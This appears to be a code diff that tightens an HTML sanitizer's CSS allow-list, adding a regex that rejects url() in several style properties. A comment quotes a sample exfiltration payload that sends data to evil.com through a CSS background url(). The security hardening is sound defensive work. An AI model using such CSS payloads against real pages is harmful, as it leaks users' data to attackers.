@@ -21,6 +21,10 @@ const ALLOWED_ATTRS_GLOBAL = [
   "data-value", "target", "rel", "loading",
 ];
 
+// Regex that rejects CSS values containing url() — prevents data exfiltration
+// via e.g. background: url('https://evil.com/pixel?data=...')
+const NO_URL_CSS = /^(?!.*url\s*\().*$/i;
+
 const SANITIZE_OPTIONS: sanitizeHtml.IOptions = {
   allowedTags: ALLOWED_TAGS,
   allowedAttributes: { "*": ALLOWED_ATTRS_GLOBAL },
@@ -29,11 +33,9 @@ const SANITIZE_OPTIONS: sanitizeHtml.IOptions = {
   allowVulnerableTags: false,
   allowedStyles: {
     "*": {
-      // Permissive style allow-list — opt-in only, mirror DOMPurify defaults.
-      // We rely on the tag/attribute filter to keep this safe (no script-equivalent).
-      "color": [/.*/],
-      "background": [/.*/],
-      "background-color": [/.*/],
+      "color": [NO_URL_CSS],
+      "background": [NO_URL_CSS],
+      "background-color": [NO_URL_CSS],
       "font-size": [/.*/],
       "font-weight": [/.*/],
       "font-family": [/.*/],
@@ -52,7 +54,7 @@ const SANITIZE_OPTIONS: sanitizeHtml.IOptions = {
       "padding-right": [/.*/],
       "padding-bottom": [/.*/],
       "padding-left": [/.*/],
-      "border": [/.*/],
+      "border": [NO_URL_CSS],
       "border-radius": [/.*/],
       "border-color": [/.*/],
       "border-width": [/.*/],
@@ -77,7 +79,7 @@ const SANITIZE_OPTIONS: sanitizeHtml.IOptions = {
       "bottom": [/.*/],
       "left": [/.*/],
       "z-index": [/.*/],
-      "transform": [/.*/],
+      "transform": [NO_URL_CSS],
       "transition": [/.*/],
       "box-shadow": [/.*/],
     },
